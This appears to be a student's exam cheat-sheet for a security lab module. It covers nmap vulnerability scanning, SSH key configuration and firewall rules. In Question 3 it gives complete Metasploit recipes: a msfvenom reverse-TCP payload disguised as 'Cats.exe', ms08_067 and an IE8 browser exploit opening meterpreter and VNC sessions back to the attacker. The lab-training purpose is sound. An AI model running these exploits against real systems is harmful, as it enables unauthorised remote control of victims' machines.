## Module 4

* For Kali, always login as root.
### Question 1

For all Windows, go to Network and Sharing Centre, then Properties, then IPV4, then Properties, and change accordingly.

For all Linux, either go to the settings for ```ens33``` , or use command line:

```bash
ip a a 192.168.1.?/24 dev eth0
```

If you are using Metasploitable with msfadmin, use ```sudo``` before the command

### Question 2 (Kali)

Use ```nmap ``` to scan your Target IP Address:

```bash
nmap -script vuln (Target IP Address)
```

For the output, try to find what is "Vulnerable", or just use:

* WIndows 10: 0
* WIndows 7: 1
* Windows XP: 3

(Not guaranteed)

### Question 3 (Kali + One Target)

No matter which exploit is assigned, open MSF with the icon on the dock:

#### Windows 10

In bash, generate the exe hook:

```bash
msfvenom -p windows/vncinject/reverse_tcp --platform windows -f exe
LHOST="(Kali IP)" LPORT=444 -o /root/Desktop/Cats.exe
```

Note ```Cats.exe``` can be named as something else, change accordingly.

Drag it to Windows 10 via Mac Desktop if required.

Then in MSF window, enter:

```bash
use multi/handler
set PAYLOAD windows/vncinject/reverse_tcp
set LPORT 444
set LHOST (Kali IP)
set viewOnly false
exploit
```

Notice: Check Paper if the exploit should be left there, if so, DO NOT enter on ```exploit```

#### Windows XP

##### VNC Injection

In MSF window, enter:

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/vncinject/reverse_tcp
set rhost (IP of XP)
set lhost (Kali IP)
set viewOnly false
exploit
```

Notice: Check Paper if the exploit should be left there, if so, DO NOT enter on ```exploit```

##### Meterpreter

In MSF window, enter:

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set rhost (IP of XP)
set lhost (Kali IP)
exploit
```

Notice: Check Paper if the exploit should be left there, if so, DO NOT enter on ```exploit```

#### Windows 7

Find the URIpath in the paper, like "catvideos".

In MSF window, enter:

```bash
use exploit/windows/browser/ms13_055_canchor
set payload windows/meterpreter/reverse_tcp
set lhost (Kali IP)
set SRVHost (Kali IP)
set SRVPort 80
set URIpath (Path in Paper)
set target 2
exploit
```

Notice: Check Paper if the exploit should be left there, if so, DO NOT enter on ```exploit```

Then put the link in IE8 of WIndows 7:

```bash
https://(IP of Kali)/(URIpath)
```

Notice: Check Paper if the exploit should be left there, if so, DO NOT enter after input of the link.

### Question 4 (CentOS)

For this question, look some given information in your paper first:

* Keypair Name: ```~/.ssh/id_(something)```
* Passphrase
* Alias for a specific machine: like ```client1```
* Preferred Login User: like ```student```

For keypair generation, go to CentOS terminal:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/id_(something)
```

You will be asked to give Passphrase, give it and confirm it:

```bash
Enter a passphrase:
Enter again to confirm:
```

Then, for adding alias for a specific host: 

```bash
nano ~/.ssh/config
```

which will open config file in nano, in nano, write:

```bash
Host (Alias)
	User (User Name)
	Hostname (IP of Target)
	IdentityFile ~/.ssh/id_(something)
	AddKeysToAgent yes
```

Then:

* Use Ctrl + x to exit
* Use Y to confirm save
* Use Enter to confirm quit

Lastly, change the config file's mode

```bash
chmod 0600 ~/.ssh/config
```

### Question 5

#### CentOS

Find in paper:

* What Protocol
* What Port Number
* What Operation need to be done: Block or Allow

In CentOS terminal, enter:

```bash
sudo iptables -A INPUT -p (Protocol) --dport (Port Number) -j (Action)
```

* Action is ACCEPT or DROP

#### Windows Server 2016

1. In Server Manger, go to "Tools", open "Windows Firewall and Security"
2. Click "Inbound Rules" in the hierarchy.
3. Click New Rules
4. In the new window, select "Custom Rules"
5. Leave "All Programs"
6. Select the Protocol you want to apply rules on, then in Local Ports, enter the port you want to apply to.
7. In Remote IP section, select to specify and add the IP of target you want to apply rules to.
8. Select the behaviour, like Block
9. Accept all domains
10. Give name and description in the paper, apply the rule.
